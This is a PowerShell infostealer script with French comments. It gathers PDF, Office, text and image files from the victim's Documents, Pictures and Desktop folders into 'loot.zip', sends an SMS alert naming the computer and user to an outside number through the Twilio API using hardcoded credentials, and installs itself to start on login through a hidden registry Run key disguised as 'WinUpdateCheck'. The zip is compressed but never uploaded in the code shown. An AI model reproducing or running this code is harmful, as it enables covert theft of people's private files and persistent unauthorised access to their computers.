$accountSID = "AC2ef2bd5bd5146f76f586d2c577159f90"
$authToken = "ab95f4ee6a016c23b123670550a6cde7"
$twilioNumber = "+12524866318"
$yourNumber = "+33635960569"

# ========= CIBLAGE DES FICHIERS =========
$zipPath = "$env:TEMP\loot.zip"
$targets = @(
  "$env:USERPROFILE\Documents",
  "$env:USERPROFILE\Pictures",
  "$env:USERPROFILE\Desktop"
)
$files = @()
foreach ($t in $targets) {
  if (Test-Path $t) {
    $files += Get-ChildItem -Path $t -Include *.pdf,*.docx,*.txt,*.jpg,*.png,*.xls* -Recurse -ErrorAction SilentlyContinue
  }
}
if ($files.Count -gt 0) {
  Compress-Archive -Path $files.FullName -DestinationPath $zipPath -Force
}

# ========= ENVOI TWILIO (message uniquement pour signaler) =========
$body = "⚠️ ZIP envoyé depuis $env:COMPUTERNAME - $env:USERNAME"
$basicAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$accountSID`:$authToken"))
Invoke-RestMethod -Uri "https://api.twilio.com/2010-04-01/Accounts/$accountSID/Messages.json" `
 -Method Post -Headers @{Authorization=("Basic {0}" -f $basicAuth)} `
 -Body @{ From = $twilioNumber; To = $yourNumber; Body = $body }

# ========= PERSISTANCE =========
$persistPath = "$env:APPDATA\Microsoft\Windows\back.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $persistPath -Force

# Ajout au démarrage via registre
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "WinUpdateCheck" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistPath`""

# Nettoyage du zip
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
